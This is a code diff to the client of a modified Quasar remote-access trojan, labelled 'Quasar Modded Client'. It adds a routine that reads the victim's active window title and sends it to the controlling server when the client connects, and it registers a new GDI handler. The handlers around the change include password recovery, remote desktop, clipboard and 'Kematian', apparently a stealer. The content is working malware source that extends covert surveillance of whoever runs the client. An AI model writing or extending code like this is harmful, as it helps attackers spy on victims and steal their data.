@@ -12,6 +12,7 @@ using Quasar.Common.Messages;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -162,9 +163,31 @@ namespace Quasar.Client
         private void ConnectClientOnClientState(Networking.Client s, bool connected)
         {
             if (connected)
+            {
                 _notifyIcon.Text = "Quasar Modded Client\nConnection established";
+                
+                string currentWindowTitle = GetCurrentWindowTitle();
+                _connectClient.Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
+            }
             else
                 _notifyIcon.Text = "Quasar Modded Client\nNo connection";
+        }
+
+        /// <summary>
+        /// Gets the title of the currently active window.
+        /// </summary>
+        /// <returns>The title of the active window.</returns>
+        private string GetCurrentWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder buff = new StringBuilder(nChars);
+            IntPtr handle = NativeMethods.GetForegroundWindow();
+
+            if (NativeMethods.GetWindowText(handle, buff, nChars) > 0)
+            {
+                return buff.ToString();
+            }
+            return null;
         }
 
         /// <summary>
@@ -187,6 +210,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new ClipboardHandler());
             _messageProcessors.Add(new KematianHandler());
             _messageProcessors.Add(new FunStuffHandler());
+            _messageProcessors.Add(new GDIHandler());
             _messageProcessors.Add(new PasswordRecoveryHandler());
             _messageProcessors.Add(new RegistryHandler());
             _messageProcessors.Add(new RemoteDesktopHandler());
